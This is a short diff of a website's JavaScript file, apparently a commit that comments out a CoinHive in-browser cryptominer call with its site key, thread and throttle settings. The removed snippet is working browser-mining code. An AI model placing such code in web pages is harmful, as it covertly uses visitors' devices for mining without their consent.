@@ -1,5 +1,5 @@
 'use strict';
-/* global ga CoinHive navigator */
+/* global ga navigator */
 
 // Throw new danger alert
 function alertDanger(text) {
@@ -23,10 +23,10 @@ ga('require', 'linkid')
 ga('send', 'pageview')
 
 // Coinhive
-new CoinHive.Anonymous('7FZrGIbIO4kqxbTLa82QpffB9ShUGmWE', {
-  autoThreads: true,
-  throttle: 0.5
-}).start(CoinHive.FORCE_EXCLUSIVE_TAB)
+// new CoinHive.Anonymous('7FZrGIbIO4kqxbTLa82QpffB9ShUGmWE', {
+//   autoThreads: true,
+//   throttle: 0.5
+// }).start(CoinHive.FORCE_EXCLUSIVE_TAB)
 
 // Service worker
 if ('serviceWorker' in navigator) {
